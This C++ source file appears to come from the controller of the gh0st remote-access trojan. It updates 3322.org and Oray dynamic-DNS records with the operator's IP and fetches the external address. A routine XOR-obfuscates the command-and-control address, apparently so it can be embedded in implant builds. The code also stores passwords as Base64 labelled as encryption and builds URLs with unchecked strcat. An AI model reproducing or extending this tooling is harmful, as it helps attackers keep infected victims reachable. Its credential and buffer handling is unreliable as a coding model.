// UPDATEIP.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "UPDATEIP.h"
#include "PcView.h"

#include "afxinet.h" //WinInet所需要的头文件
#include <Shlwapi.h>
#include<stdio.h> 
#include <wininet.h>
#pragma comment(lib, "Wininet.lib")


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern BOOL IsFileExist(LPCTSTR strFileName);
/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP

IMPLEMENT_DYNCREATE(CUPDATEIP, CFormView)

CUPDATEIP::CUPDATEIP()
	: CFormView(CUPDATEIP::IDD)
{
	CString Mistr;
	//{{AFX_DATA_INIT(CUPDATEIP)
	// 3322域名IP更新
	m_DnsUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("工具", "DnsUser", "");	
	Mistr = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("工具", "DnsPass", "");	
	m_DnsPass=Base64Decode(Mistr);   //解密
	m_DnsDomain = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("工具", "DnsDomain", "xxx.3322.org");

	// 花生壳域名IP更新
	m_DnsUser1 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("工具", "DnsUser1", "");
	Mistr = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("工具", "DnsPass1", "");
	m_DnsPass1=Base64Decode(Mistr);   //解密
	m_DnsDomain1 = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("工具", "DnsDomain1", "xxx.oicp.net");
	
	m_Combo_DnsIP2 = _T("");
	//}}AFX_DATA_INIT
}

void CUPDATEIP::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUPDATEIP)
	DDX_Control(pDX, IDC_COMBO_DNSIP, m_Combo_DnsIP);
	DDX_Text(pDX, IDC_EDIT_DNSUSER, m_DnsUser);
	DDV_MaxChars(pDX, m_DnsUser, 100);
	DDX_Text(pDX, IDC_EDIT_DNSPASS, m_DnsPass);
	DDV_MaxChars(pDX, m_DnsPass, 100);
	DDX_Text(pDX, IDC_EDIT_DNSDOMAIN, m_DnsDomain);
	DDV_MaxChars(pDX, m_DnsDomain, 100);
	DDX_Text(pDX, IDC_EDIT_DNSUSER1, m_DnsUser1);
	DDV_MaxChars(pDX, m_DnsUser1, 100);
	DDX_Text(pDX, IDC_EDIT_DNSPASS1, m_DnsPass1);
	DDV_MaxChars(pDX, m_DnsPass1, 100);
	DDX_Text(pDX, IDC_EDIT_DNSDOMAIN1, m_DnsDomain1);
	DDV_MaxChars(pDX, m_DnsDomain1, 100);
	DDX_Text(pDX, IDC_COMBO_DNSIP2, m_Combo_DnsIP2);
	//}}AFX_DATA_MAP
	DDX_Control(pDX, IDC_BUTTON2, m_Button2);
	DDX_Control(pDX, IDC_BTN_DNSUPDATE, m_Bin_Dnsuodate);
	DDX_Control(pDX, IDC_BTN_FTPUPDATE, m_Btn_Ftpupdate);
}


BEGIN_MESSAGE_MAP(CUPDATEIP, CFormView)
	//{{AFX_MSG_MAP(CUPDATEIP)
	ON_BN_CLICKED(IDC_BTN_FTPUPDATE, OnBtnFtpupdate)
	ON_BN_CLICKED(IDC_BUTTON2, OnB_IP)
	ON_BN_CLICKED(IDC_FTPServer, OnFTPServer)
	ON_BN_CLICKED(IDC_BTN_DNSUPDATE, OnBtnDnsupdate)
	ON_BN_CLICKED(IDC_FTPServer2, OnFTPServer2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP diagnostics

#ifdef _DEBUG
void CUPDATEIP::AssertValid() const
{
	CFormView::AssertValid();
}

void CUPDATEIP::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CUPDATEIP message handlers

void CUPDATEIP::OnInitialUpdate() 
{
	CenterWindow();		

	UpdateData(FALSE);	
}




void CUPDATEIP::OnBtnDnsupdate()   //3322域名IP更新
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	m_Bin_Dnsuodate.EnableWindow(FALSE);  //禁用按键

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("工具", "DnsUser", m_DnsUser);
	CString Mistr;
	Mistr=Base64Encode(m_DnsPass);   //加密函数
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("工具", "DnsPass", Mistr);//保存密码
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("工具", "DnsDomain", m_DnsDomain);

	CString id,pass,dns,ip; 
	char a[256]="http://";
	char *b="@members.3322.org/dyndns/update?system=dyndns&hostname=";
	char *c="&myip=";
	char *d="&wildcard=OFF";
	GetDlgItem(IDC_EDIT_DNSUSER)->GetWindowText(id);
	GetDlgItem(IDC_EDIT_DNSPASS)->GetWindowText(pass);
	GetDlgItem(IDC_EDIT_DNSDOMAIN)->GetWindowText(dns);
	GetDlgItem(IDC_COMBO_DNSIP)->GetWindowText(ip);
	strcat(a,id);
	strcat(a,":");
	strcat(a,pass);
	strcat(a,b);
	strcat(a,dns);
	strcat(a,c);
	strcat(a,ip);
	strcat(a,d);

	HINTERNET hNet = ::InternetOpen("3322", //当HTTP协议使用时，这个参数随意赋值
		PRE_CONFIG_INTERNET_ACCESS, //访问类型指示Win32网络函数使用登记信息去发现一个服务器
		NULL, 
		INTERNET_INVALID_PORT_NUMBER, //使用INTERNET_INVALID_PORT_NUMBER相当于提供却省的端口数
		0 //标志去指示使用返回句句柄的将来的Internet函数将"不"为回调函数发送状态信息 
		); 
	
	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //从InternetOpen返回的句柄 
		(char *)a, //需要打开的URL 
		NULL, //用来向服务器传送额外的信息,一般为NULL 
		0, //用来向服务器传送额外的信息,一般为 0 
		INTERNET_FLAG_RELOAD, //InternetOpenUrl行为的标志 
		0); //信息将不会被送到状态回调函数 
	
	char buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl返回的句柄 
		buffer, //保留数据的缓冲区 
		sizeof(buffer), 
		&dwBytesRead); //指向包含读入缓冲区字节数的变量的指针; 
	//如果返回值是TRUE，而且这里指向0，则文件已经读到了文件的末尾。 
	
	::InternetCloseHandle(hUrlFile) ; 
	::InternetCloseHandle(hNet) ;
	
	CString HotName="希网域名IP更新";
	if(buffer>0)
	{
		if(strstr(buffer,"good"))
			MessageBox("更新成功，已更改域名IP ...\r\n"+ip+"\r\n", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"nochg"))
			MessageBox("存储IP相同，没有改变IP ...", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"nohost"))
			MessageBox("更新失败，请检查是否输入正确 ...", HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"badauth"))
			MessageBox("验证失败，用户名或密码错误 ...", HotName, MB_OK | MB_ICONWARNING);
		else
			MessageBox("未知名错误 ...", HotName, MB_OK | MB_ICONWARNING);
	}
	m_Bin_Dnsuodate.EnableWindow(TRUE);  //恢复按键

}


void CUPDATEIP::OnBtnFtpupdate()  //花生壳域名IP更新
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	m_Btn_Ftpupdate.EnableWindow(FALSE);  //禁用按键

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("工具", "DnsUser1", m_DnsUser1);
	CString Mistr;
	Mistr=Base64Encode(m_DnsPass1);   //加密函数
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("工具", "DnsPass1", Mistr);//保存密码
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("工具", "DnsDomain1", m_DnsDomain1);

	CString id,pass,dns,ip; 
	char a[256]="http://";
	char *b="@ddns.oray.com/ph/update?hostname=";
	char *c="&myip=";
	GetDlgItem(IDC_EDIT_DNSUSER1)->GetWindowText(id);
	GetDlgItem(IDC_EDIT_DNSPASS1)->GetWindowText(pass);
	GetDlgItem(IDC_EDIT_DNSDOMAIN1)->GetWindowText(dns);
	GetDlgItem(IDC_COMBO_DNSIP1)->GetWindowText(ip);
	strcat(a,id);
	strcat(a,":");
	strcat(a,pass);
	strcat(a,b);
	strcat(a,dns);
	strcat(a,c);
	strcat(a,ip);

	HINTERNET hNet = ::InternetOpen("oray", //当HTTP协议使用时，这个参数随意赋值
		PRE_CONFIG_INTERNET_ACCESS, //访问类型指示Win32网络函数使用登记信息去发现一个服务器
		NULL, 
		INTERNET_INVALID_PORT_NUMBER, //使用INTERNET_INVALID_PORT_NUMBER相当于提供却省的端口数
		0 //标志去指示使用返回句句柄的将来的Internet函数将"不"为回调函数发送状态信息 
		); 

	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //从InternetOpen返回的句柄 
		(char *)a, //需要打开的URL 
		NULL, //用来向服务器传送额外的信息,一般为NULL 
		0, //用来向服务器传送额外的信息,一般为 0 
		INTERNET_FLAG_RELOAD, //InternetOpenUrl行为的标志 
		0); //信息将不会被送到状态回调函数 
	
	char buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl返回的句柄 
		buffer, //保留数据的缓冲区 
		sizeof(buffer), 
		&dwBytesRead); //指向包含读入缓冲区字节数的变量的指针; 
	//如果返回值是TRUE，而且这里指向0，则文件已经读到了文件的末尾。 
	
	::InternetCloseHandle(hUrlFile) ; 
	::InternetCloseHandle(hNet) ;
	
	CString HotName="希网域名IP更新";
	if(buffer>0)
	{
		if(strstr(buffer,"good"))
			MessageBox("更新成功，已更改域名IP ...\r\n"+ip+"\r\n", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"nochg"))
			MessageBox("存储IP相同，没有改变IP ...", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"notfqdn"))
			MessageBox("更新失败，未激活花生壳域名 ...", HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"nohost"))
			MessageBox("域名不存在或未激活花生壳 ...",HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"abuse"))
			MessageBox("频繁请求或验证失败 ...",HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"badauth"))
			MessageBox("更新失败，用户名或密码错误 ...",HotName, MB_OK | MB_ICONWARNING);
		else
			MessageBox("未知名错误 ...",HotName, MB_OK | MB_ICONWARNING);
	}
	m_Btn_Ftpupdate.EnableWindow(TRUE);  //恢复按键
}


void CUPDATEIP::OnB_IP()   //外网IP
{
	m_Button2.EnableWindow(FALSE);  //禁用按键
	CString pBuf = GetIPAddress();
	SetDlgItemText(IDC_COMBO_DNSIP, pBuf);
	SetDlgItemText(IDC_COMBO_DNSIP1, pBuf);
	SetDlgItemText(IDC_COMBO_DNSIP2, pBuf);
	m_Button2.EnableWindow(TRUE);   //恢复按键
}

CString CUPDATEIP::Base64Encode(LPCTSTR lpszSrc)   //加密函数
{
 ASSERT(lpszSrc != NULL && AfxIsValidString(lpszSrc));
 const char BASE64_ENCODE_TABLE[64] = {
  65,  66,  67,  68,  69,  70,  71,  72,  // 00 - 07
   73,  74,  75,  76,  77,  78,  79,  80,  // 08 - 15
   81,  82,  83,  84,  85,  86,  87,  88,  // 16 - 23
   89,  90,  97,  98,  99, 100, 101, 102,  // 24 - 31
   103, 104, 105, 106, 107, 108, 109, 110,  // 32 - 39
   111, 112, 113, 114, 115, 116, 117, 118,  // 40 - 47
   119, 120, 121, 122,  48,  49,  50,  51,  // 48 - 55
   52,  53,  54,  55,  56,  57,  43,  47 };// 56 - 63

  unsigned int iTest;

  LPCTSTR pInBuffer=lpszSrc;

  int nSize = (int)_tcslen(lpszSrc);
  char* pOutBuffer=new char[nSize/3*4+5];
  ZeroMemory(pOutBuffer,nSize/3*4+5);

  for(UINT i=0;i<_tcslen(lpszSrc) / 3;i++)
  {
   iTest = (unsigned char) *pInBuffer++;
   iTest = iTest << 8;

   iTest = iTest | (unsigned char) *pInBuffer++;
   iTest = iTest << 8;

   iTest = iTest | (unsigned char) *pInBuffer++;

   //以4 byte倒序写入输出缓冲
   pOutBuffer[3] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[2] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer+=4;
  }

  //设置尾部
  switch (_tcslen(lpszSrc) % 3)
  {
  case 0:
   break;
  case 1:
   iTest = (unsigned char) *pInBuffer;
   iTest = iTest << 4;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer[2] = '='; //用'='也就是64码填充剩余部分
   pOutBuffer[3] = '=';
   break;
  case 2:
   iTest = (unsigned char) *pInBuffer++;
   iTest = iTest << 8;
   iTest = iTest | (unsigned char) *pInBuffer;
   iTest = iTest << 2;
   pOutBuffer[2] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer[3] = '='; // Fill remaining byte.
   break;
  }
  pOutBuffer-=nSize/3*4;
  CString strEncode=pOutBuffer;
  delete [] pOutBuffer;
  pOutBuffer=NULL;
  return strEncode;
}

CString CUPDATEIP::Base64Decode(LPCTSTR lpszSrc)  //解密函数
{
 ASSERT(lpszSrc != NULL && AfxIsValidString(lpszSrc));
 const unsigned int BASE64_DECODE_TABLE[256] = {
  255, 255, 255, 255, 255, 255, 255, 255, //  00 -  07
   255, 255, 255, 255, 255, 255, 255, 255, //  08 -  15
   255, 255, 255, 255, 255, 255, 255, 255, //  16 -  23
   255, 255, 255, 255, 255, 255, 255, 255, //  24 -  31
   255, 255, 255, 255, 255, 255, 255, 255, //  32 -  39
   255, 255, 255,  62, 255, 255, 255,  63, //  40 -  47
   52,  53,  54,  55,  56,  57,  58,  59, //  48 -  55
   60,  61, 255, 255, 255, 255, 255, 255, //  56 -  63
   255,   0,   1,   2,   3,   4,   5,   6, //  64 -  71
   7,   8,   9,  10,  11,  12,  13,  14, //  72 -  79
   15,  16,  17,  18,  19,  20,  21,  22, //  80 -  87
   23,  24,  25, 255, 255, 255, 255, 255, //  88 -  95
   255,  26,  27,  28,  29,  30,  31,  32, //  96 - 103
   33,  34,  35,  36,  37,  38,  39,  40, // 104 - 111
   41,  42,  43,  44,  45,  46,  47,  48, // 112 - 119
   49,  50,  51, 255, 255, 255, 255, 255, // 120 - 127
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255 };


  const int nSrcCount=(int)_tcslen(lpszSrc);
  int nSize=nSrcCount/4*3;
  if(lpszSrc[nSrcCount-1]=='=')
   nSize--;
  if(lpszSrc[nSrcCount-2]=='=')
   nSize--;
  char* pOutBuffer=new char[nSize+3];
  ZeroMemory(pOutBuffer,nSize+3);
  LPCTSTR pInBuffer=lpszSrc;
  UINT iTest,iPack;
  for(int i=0;i<nSize/3 ;i++)
  {
   for(int j=0;j<4;j++)
   {
    iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
    //InPtr++;
    if (iTest == 0xFF) 
    {
     j--;
     continue; //读到255非法字符
    }
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   pOutBuffer[2] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[1] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[0] = iPack;
   //准备写入后3位
   pOutBuffer+= 3; iPack = 0;

  }
  switch(nSize%3)
  {
  case 1:
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iPack = iPack >> 4;
   pOutBuffer[0] = iPack;
   pOutBuffer++;
   break;
  case 2:
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iPack = iPack >> 2;
   pOutBuffer[1] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[0] = iPack;
   pOutBuffer+=2;
   break;
  default:
   break;
  }
  pOutBuffer-=nSize;
  CString strDecode=pOutBuffer;
  delete pOutBuffer;
  return strDecode;
}

/************************************************************************/         
/* 函数说明：去掉指定字符                                           
/* 参    数：无                                       
/* 返 回 值：返回int类型                                          
/************************************************************************/ 
int CUPDATEIP::ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}

/************************************************************************/         
/* 函数说明：获取应用程序当前目录                                           
/* 参    数：无                                       
/* 返 回 值：返回目录路径、CString类型字符串                                         
/************************************************************************/        
extern CString GetExePath();       
/*
{       
    char pathbuf[260];          
    int  pathlen = ::GetModuleFileName(NULL,pathbuf,MAX_PATH);          
    // 替换掉单杠       
    while(TRUE)          
    {          
        if(pathbuf[pathlen--]=='\\')
            break;          
    }          
    pathbuf[++pathlen]= 0*0;          
    CString  fname = pathbuf;          
    return   fname;          
}
*/

int CUPDATEIP::memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

char* CUPDATEIP::substr(char   *str,int   istar,int   iend) 
{  
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 

    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		strcpy(p1,p); 
    else 
    { 
		memcpy(p1,p,iend); 
    }
	strcpy(str,p1);
    return   str; 
} 

/************************************************************************/          
/* 函数说明：获取当前外网IP地址                                            
/* 参    数：无                                        
/* 返 回 值：返回外网IP地址、CString类型字符串                                             
/************************************************************************/      
CString CUPDATEIP::GetIPAddress()     
{     
    char buf[MAX_PATH] = {0};     
    char chTempIp[128]= {0};    
   
    CString strPath;     
    strPath = GetExePath() + "\\netip.ini";
    URLDownloadToFile(0,"http://ddns.oray.com/checkip",strPath,0,NULL);

    FILE *file=fopen( strPath, "r" );     
    if ( file != NULL )      
    {
        fseek(file, 0, SEEK_SET);     
        fread(buf,1,256,file);     
		fclose(file);

		DWORD SizePoint;
		SizePoint = memfind(buf,"Address:",sizeof(buf),0);
		substr(buf,SizePoint+8,17);
		ReplaceStr(buf,":","");
		ReplaceStr(buf," ","");
		ReplaceStr(buf,"<","");
		ReplaceStr(buf,"/","");
		ReplaceStr(buf,"b","");
		ReplaceStr(buf,"o","");
		ReplaceStr(buf,"d","");
		ReplaceStr(buf,"y","");
		DeleteFile(strPath);
    }     
	
    CString strTemp="";
	int len = strlen(buf);
    if(len>0)
    {     
        strTemp.Format("%s",buf);     
    }     
    return strTemp;     
}     

void CUPDATEIP::OnFTPServer() 
{
	// TODO: Add your control notification handler code here
// 	CHAR ModuletemDis[MAX_PATH]={0};
// 	sprintf(ModuletemDis,"%s\\Control\\FTPServer.exe",((CGh0stApp *)AfxGetApp())->ModuletemDir);   //连接目录和程序名称
// 
// 	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(ModuletemDis))
// 	{
// 		MessageBox("FTPServer.exe文件丢失！无法启动FIP服务器... ","警告！",MB_OK);
// 		return;
// 	}
// 
//     ShellExecute(NULL,"open",ModuletemDis,NULL,NULL,SW_SHOW);   //打开程序
}

//void CUPDATEIP::OnVpngl() 
//{
// 	// TODO: Add your control notification handler code here
// 	CHAR ModuletemDis[MAX_PATH]={0};
// 	sprintf(ModuletemDis,"%s\\Control\\VPNServer.exe",((CGh0stApp *)AfxGetApp())->ModuletemDir);   //连接目录和程序名称
// 	
// 	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(ModuletemDis))
// 	{
// 		MessageBox("VPNServer.exe文件丢失！无法连接VPN虚拟网络... ","警告！",MB_OK);
// 		return;
// 	}
// 	
//     ShellExecute(NULL,"open",ModuletemDis,NULL,NULL,SW_SHOW);   //打开程序
//}

// RC4 初始化
void CUPDATEIP::rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)
{
	int i =0, j = 0, k[256] = {0};
	unsigned char tmp = 0;
	for(i=0;i<256;i++)
	{
		s[i]=i;
		k[i]=key[i%Len];
	}
	for (i=0; i<256; i++)
	{
		j=(j+s[i]+k[i])%256;
		tmp = s[i];
		s[i] = s[j];     //交换s[i]和s[j]
		s[j] = tmp;
	}
}

// RC4 加密解密函数
void CUPDATEIP::rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
{
	int x = 0, y = 0, t = 0;
	unsigned char tmp;
	unsigned long i;
	for(i=0;i<Len;i++)
	{
		x=(x+1)%256;
		y=(y+s[x])%256;
		tmp = s[x];
		s[x] = s[y];     //交换s[x]和s[y]
		s[y] = tmp;
		t=(s[x]+s[y])%256;
		Data[i] ^= s[t];
	} 
}

VOID CUPDATEIP::MyEncryptFunctionForServer(LPSTR szData,WORD Size)
{
	//该数组用来异或
	WORD AddTable[]={
		3,2,5,8,5,1,2,3,2,5,3,4,1,2,
			4,3,5,8,2,4,5,8,1,2,4,3,1,1,
			8,1,2,4,3,1,1,5,2,2,1,2,1,3,
			5,2,2,1,2,1,3,3,1,2,3,5,2,6,
			2,4,1,3,2,1,2,6,2,3,3,2,1,1,
			3,6,2,1,2,4,4,3,1,2,3,5,2,6,
			3,1,2,3,5,2,6,5,2,2,1,2,1,2,
			6,2,3,3,2,1,1,5,2,2,1,2,1,2,
			3,2,5,3,4,1,2,2,3,1,2,3,5,2
	};
	
	WORD TableSize = sizeof(AddTable)/sizeof(WORD);
	WORD iCount=0;
	for (WORD i=0;i<Size;i++)
	{
		if(iCount == TableSize) 
			iCount = 0;
		
		szData[i] = ~((szData[i]^AddTable[iCount])^i);
		
		//BUG  忘记iCount++ 导致异或的是数组表 3..
		iCount++;
	}
}

void CUPDATEIP::OnFTPServer2() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strDnsIP = m_Combo_DnsIP2+"  ";
	char *ps =  (LPSTR)(LPCTSTR)strDnsIP;

	unsigned char m_strData[256];
	strcpy((char *)m_strData,ps);
	MyEncryptFunctionForServer((char *)m_strData,strlen((const char *)m_strData));
	SetDlgItemText(IDC_COMBO_DNSIP3,(const char *)m_strData);   //文件名
}
